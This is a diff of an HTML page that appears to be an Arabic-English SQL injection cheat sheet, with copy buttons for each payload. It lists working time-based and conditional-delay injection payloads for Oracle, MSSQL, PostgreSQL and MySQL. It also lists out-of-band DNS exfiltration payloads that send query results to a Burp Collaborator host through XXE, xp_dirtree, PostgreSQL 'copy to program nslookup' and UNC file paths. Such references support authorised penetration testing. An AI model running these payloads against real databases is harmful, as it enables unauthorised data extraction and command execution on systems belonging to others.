+            <tr data-db="postgres"><td><span class="db-badge db-postgres">POSTGRES</span></td><td>QUERY-1-HERE; QUERY-2-HERE <button class="btn-copy" onclick="copyCode('QUERY-1-HERE; QUERY-2-HERE')"><i class="bx bx-copy"></i> Copy</button></td></tr>
+            <tr data-db="mysql"><td><span class="db-badge db-mysql">MYSQL</span></td><td>QUERY-1-HERE; QUERY-2-HERE (Supported in PHP mysqli / Python multi-query APIs) <button class="btn-copy" onclick="copyCode('QUERY-1-HERE; QUERY-2-HERE')"><i class="bx bx-copy"></i> Copy</button></td></tr>
+          </tbody>
+        </table>
+      </div>
     </div>
 
-    <!-- 9. TIME DELAYS & CONDITIONAL DELAYS -->
-    <div class="section-card">
-      <h2 class="section-title">9 & 10. Time delays & Conditional delays (التأخير الوقتي والتأخير الشرطي)</h2>
-      <table class="cs-table">
-        <thead><tr><th>DB Type</th><th>Unconditional Delay</th><th>Conditional Delay</th></tr></thead>
-        <tbody>
-          <tr><td><span class="db-badge db-oracle">Oracle</span></td><td>dbms_pipe.receive_message(('a'),10)</td><td>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual</td></tr>
-          <tr><td><span class="db-badge db-mssql">MSSQL</span></td><td>WAITFOR DELAY '0:0:10'</td><td>IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'</td></tr>
-          <tr><td><span class="db-badge db-postgres">PostgreSQL</span></td><td>SELECT pg_sleep(10)</td><td>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END</td></tr>
-          <tr><td><span class="db-badge db-mysql">MySQL</span></td><td>SELECT SLEEP(10)</td><td>SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')</td></tr>
-        </tbody>
-      </table>
+    <!-- 9 & 10. TIME DELAYS & CONDITIONAL DELAYS -->
+    <div class="section-card payload-card">
+      <h2 class="section-title"><span>9 & 10. Time Delays & Conditional Delays (التأخير الوقتي والشرطي)</span> <i class="bx bx-time-five" style="color:#64748b;"></i></h2>
+      <div class="cs-table-wrapper">
+        <table class="cs-table">
+          <thead><tr><th style="width:140px;">DB Engine</th><th>Unconditional Sleep Payload</th><th>Conditional Sleep Payload</th></tr></thead>
+          <tbody>
+            <tr data-db="oracle"><td><span class="db-badge db-oracle">ORACLE</span></td><td>dbms_pipe.receive_message(('a'),10)</td><td>SELECT CASE WHEN (CONDITION) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual <button class="btn-copy" onclick="copyCode('SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN \'a\'||dbms_pipe.receive_message((\'a\'),10) ELSE NULL END FROM dual')"><i class="bx bx-copy"></i> Copy</button></td></tr>
+            <tr data-db="mssql"><td><span class="db-badge db-mssql">MSSQL</span></td><td>WAITFOR DELAY '0:0:10'</td><td>IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10' <button class="btn-copy" onclick="copyCode('IF (YOUR-CONDITION-HERE) WAITFOR DELAY \'0:0:10\'')"><i class="bx bx-copy"></i> Copy</button></td></tr>
+            <tr data-db="postgres"><td><span class="db-badge db-postgres">POSTGRES</span></td><td>SELECT pg_sleep(10)</td><td>SELECT CASE WHEN (CONDITION) THEN pg_sleep(10) ELSE pg_sleep(0) END <button class="btn-copy" onclick="copyCode('SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END')"><i class="bx bx-copy"></i> Copy</button></td></tr>
+            <tr data-db="mysql"><td><span class="db-badge db-mysql">MYSQL</span></td><td>SELECT SLEEP(10)</td><td>SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a') <button class="btn-copy" onclick="copyCode('SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),\'a\')')"><i class="bx bx-copy"></i> Copy</button></td></tr>
+          </tbody>
+        </table>
+      </div>
     </div>
 
-    <!-- 11 & 12. DNS LOOKUPS & DATA EXFILTRATION -->
-    <div class="section-card">
-      <h2 class="section-title">11 & 12. DNS lookup & Data exfiltration via Burp Collaborator</h2>
-      <table class="cs-table">
-        <thead><tr><th>DB Type</th><th>DNS Lookup Payload</th><th>Data Exfiltration Payload</th></tr></thead>
-        <tbody>
-          <tr><td><span class="db-badge db-oracle">Oracle</span></td><td>SELECT EXTRACTVALUE(xmltype('&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"&gt; %remote;]&gt;'),'/l') FROM dual</td><td>SELECT EXTRACTVALUE(xmltype('&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"&gt; %remote;]&gt;'),'/l') FROM dual</td></tr>
-          <tr><td><span class="db-badge db-mssql">MSSQL</span></td><td>exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'</td><td>declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')</td></tr>
-          <tr><td><span class="db-badge db-postgres">PostgreSQL</span></td><td>copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'</td><td>create OR replace function f() returns void as $$ declare c text; declare p text; begin SELECT into p (SELECT YOUR-QUERY-HERE); c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN'''; execute c; END; $$ language plpgsql security definer; SELECT f();</td></tr>
-          <tr><td><span class="db-badge db-mysql">MySQL</span></td><td>LOAD_FILE('\\\\\\\\BURP-COLLABORATOR-SUBDOMAIN\\\\a')</td><td>SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\\\\\BURP-COLLABORATOR-SUBDOMAIN\\\\a'</td></tr>
-        </tbody>
-      </table>
+    <!-- 11 & 12. BURP COLLABORATOR DNS EXFILTRATION -->
+    <div class="section-card payload-card">
+      <h2 class="section-title"><span>11 & 12. Burp Collaborator OOB DNS Lookups & Data Exfiltration</span> <i class="bx bx-radio-circle-marked" style="color:#64748b;"></i></h2>
+      <div class="cs-table-wrapper">
+        <table class="cs-table">
+          <thead><tr><th style="width:140px;">DB Engine</th><th>DNS Ping Payload</th><th>Out-of-Band Data Exfiltration Payload</th></tr></thead>
+          <tbody>
+            <tr data-db="oracle"><td><span class="db-badge db-oracle">ORACLE</span></td><td>SELECT EXTRACTVALUE(xmltype('&lt;?xml...SYSTEM "http://BURP-COLLABORATOR/"&gt;'),'/l') FROM dual</td><td>SELECT EXTRACTVALUE(xmltype('&lt;?xml...SYSTEM "http://'||(SELECT QUERY)||'.BURP-COLLABORATOR/"&gt;'),'/l') FROM dual <button class="btn-copy" onclick="copyCode('SELECT EXTRACTVALUE(xmltype(\'<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://\'||(SELECT YOUR-QUERY-HERE)||\'.BURP-COLLABORATOR-SUBDOMAIN/\"> %remote;]>\'),\'/l\') FROM dual')"><i class="bx bx-copy"></i> Copy</button></td></tr>
+            <tr data-db="mssql"><td><span class="db-badge db-mssql">MSSQL</span></td><td>exec master..xp_dirtree '//BURP-COLLABORATOR/a'</td><td>declare @p varchar(1024);set @p=(SELECT QUERY);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR/a"') <button class="btn-copy" onclick="copyCode('declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec(\'master..xp_dirtree \"//\'+@p+\'.BURP-COLLABORATOR-SUBDOMAIN/a\"\')')"><i class="bx bx-copy"></i> Copy</button></td></tr>
+            <tr data-db="postgres"><td><span class="db-badge db-postgres">POSTGRES</span></td><td>copy (SELECT '') to program 'nslookup BURP-COLLABORATOR'</td><td>create OR replace function f()... 'nslookup '||p||'.BURP-COLLABORATOR'... SELECT f(); <button class="btn-copy" onclick="copyCode('copy (SELECT \'\') to program \'nslookup BURP-COLLABORATOR-SUBDOMAIN\'')"><i class="bx bx-copy"></i> Copy</button></td></tr>
+            <tr data-db="mysql"><td><span class="db-badge db-mysql">MYSQL</span></td><td>LOAD_FILE('\\\\\\\\BURP-COLLABORATOR\\\\a')</td><td>SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\\\\\BURP-COLLABORATOR\\\\a' <button class="btn-copy" onclick="copyCode('SELECT YOUR-QUERY-HERE INTO OUTFILE \'\\\\\\\\\\\\\\\\BURP-COLLABORATOR-SUBDOMAIN\\\\\\\\a\'')"><i class="bx bx-copy"></i> Copy</button></td></tr>
+          </tbody>
+        </table>
+      </div>
     </div>
 
   </div>
+
+  <div id="toast" class="copy-toast"><i class="bx bx-check-circle"></i> تم نسخ الشفرة بنجاح إلى الحافظة!</div>
+
+  <script>
+    function copyCode(text) {
+      navigator.clipboard.writeText(text);
+      const toast = document.getElementById("toast");
+      toast.style.display = "block";
+      setTimeout(() => toast.style.display = "none", 2500);
+    }
+
+    function filterDB(db, btn) {
+      document.querySelectorAll(".filter-btn").forEach(b => b.classList.remove("active"));
+      btn.classList.add("active");
+      
+      const rows = document.querySelectorAll(".cs-table tbody tr");
+      rows.forEach(r => {
+        if (db === "all" || r.getAttribute("data-db") === db) {
+          r.style.display = "";
+        } else {
+          r.style.display = "none";
+        }
+      });
+    }
+
+    function filterPayloads() {
+      const query = document.getElementById("payload-search").value.toLowerCase();
+      const cards = document.querySelectorAll(".payload-card");
+      cards.forEach(card => {
+        const text = card.innerText.toLowerCase();
+        if (text.includes(query)) {
+          card.style.display = "";
+        } else {
+          card.style.display = "none";
+        }
+      });
+    }
+  </script>
 </body>
 </html>
